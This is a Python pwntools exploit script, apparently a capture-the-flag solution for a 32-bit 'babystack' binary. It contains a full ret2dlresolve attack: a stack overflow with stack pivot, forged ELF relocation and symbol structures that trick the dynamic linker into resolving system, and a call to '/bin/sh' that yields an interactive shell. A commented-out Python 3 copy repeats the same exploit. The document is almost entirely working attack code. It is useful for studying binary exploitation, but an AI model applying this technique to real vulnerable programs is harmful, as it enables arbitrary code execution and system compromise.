main_addr = 0x8048457
fun_addr = 0x804843B
read_plt = 0x8048300
read_got = 0x804A00C

from pwn import *

elf = ELF("./babystack")
p = elf.process()
# gdb.attach(p, gdbscript='b *0x8048455')

resolver = 0x80482F0  # push link_map and call dl_resolve
buf = 0x804AF00  # controllable area | segment rw-p
leave_ret = 0x80483A8  # leave ; ret

# # readelf -d ./babystack
STRTAB = 0x804822C
SYMTAB = 0x80481CC
JMPREL = 0x80482B0

# Pivoting the stack and calling read(0, buf, 0x80) for the rest of the payload
buffer = ""
buffer += "A" * 40
buffer += p32(buf)  # stack pivoting. (esp = buff)
buffer += p32(elf.plt["read"]) + p32(leave_ret)
buffer += p32(0) + p32(buf) + p32(0x80)

log.success("Length buffer: " + str(hex(len(buffer))))

# Compute offsets and forged structures
forged_ara = buf + 0x14  # 0x14 is first pl2
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8  # 0x8 | size of elf32_rel

align = 0x10 - (
    (elf32_sym - SYMTAB) % 0x10
)  # align to 0x10 | index = (elf32_sym entry - SYMTAB ) % 0x10 = 0

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

# fake st_name (sym_entry->st_name)
st_name = (elf32_sym + 0x10) - STRTAB

# fake struct "Elf32_Rel *rel_entry"
elf32_rel_struct = p32(elf.got["read"]) + p32(r_info)

# fake struct "Elf32_Sym *sym_entry"
elf32_sym_struct = p32(st_name) + p32(0)
elf32_sym_struct += p32(0) + p32(0x12)

# Rest of the payload: dl-resolve hack :) (the real deal)
# buffer2 is input start buf = 0x804af00
buffer2 = "AAAA"  # fake ebp | leave ; ret = mov esp, ebp ; pop ebp ; pop eip
buffer2 += p32(resolver)  # ret2dlresolve
buffer2 += p32(rel_offset)  # JMPREL + offset = struct

# After first part of buffer2 resolver return function system
buffer2 += "AAAA"  # fake return of system
buffer2 += p32(buf + 100)  # system parameter

# fake struct start "forged_ara = buf + 0x14
buffer2 += elf32_rel_struct  # (buf+0x14)
buffer2 += "A" * align
buffer2 += elf32_sym_struct  # (buf+0x20)
buffer2 += "system\x00"

# align to addr "/bin/sh" = buf + 100
length = 100 - len(buffer2)
buffer2 += "A" * length
buffer2 += "/bin/sh\x00"

# to length payload = 0x80
length = 0x80 - len(buffer2)
buffer2 += "A" * length

log.success("Length buffer2: " + str(hex(len(buffer2))))

payload = buffer + buffer2

p.sendline(payload)
p.interactive()

#!/usr/bin/env python3
# from pwn import *
# elf = ELF("./babystack")
# p = elf.process()
# gdb.attach(p, '''
# 	b *0x8048455
# 	''')

# main_addr = 0x8048457
# func_addr = 0x804843b
# read_plt = elf.symbols["read"]
# read_got = elf.got["read"]
# call_resolve = 0x80482f0 # push link_map and call dl_resolve
# leave_ret = 0x80483A8 	 # leave ; ret
# wr_segment = 0x804AF00	 # segment rw-p

# # readelf -d ./babystack
# STRTAB = 0x804822C
# SYMTAB = 0x80481CC
# JMPREL = 0x80482B0

# # 1 | Pivoting the stack and calling read(0, buf, 0x80) for the rest of the payload
# pl1 = b""
# pl1 += b"A" * 40
# pl1 += p32(wr_segment)
# pl1 += p32(read_plt) + p32(leave_ret)
# pl1 += p32(0) + p32(wr_segment) + p32(0x80)
# log.info("Length pl1: " + hex(len(pl1)))

# # fake struct
# fake_area = wr_segment + 0x14
# rel_offset = fake_area - JMPREL # offset (elf32_rel entry fake) vs JMPREL
# # choice fake_area is start struct elf32_rel entry

# elf32_sym = fake_area + 0x8 # size of elf32_rel
# align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)
# elf32_sym = elf32_sym + align
# index_sym = (elf32_sym - SYMTAB) / 0x10

# r_info = (int(index_sym) << 8) | 0x7

# st_name = (elf32_sym + 0x10) - STRTAB

# elf32_rel_entry = p32(read_got) + p32(r_info)
# # after resolve read_got container system_libc addr
# elf32_sym_entry = p32(st_name) + p32(0)
# elf32_sym_entry += p32(0) + p32(0x12)

# # 2
# pl2 = b""
# pl2 += b"AAAA"
# pl2 += p32(call_resolve)
# pl2 += p32(rel_offset)
# pl2 += b"AAAA"
# pl2 += p32(wr_segment + 100)
# pl2 += elf32_rel_entry
# pl2 += b"A" * align
# pl2 += elf32_sym_entry
# pl2 += b"system\x00"

# length = 100 - len(pl2)
# pl2 += b"A" * length
# pl2 += b"/bin/sh\x00"

# length = 0x80 - len(pl2)
# pl2 += b"A" * length
# log.info("Length pl2: " + hex(len(pl2)))

# p.send(pl1)
# p.send(pl2)


# p.interactive()
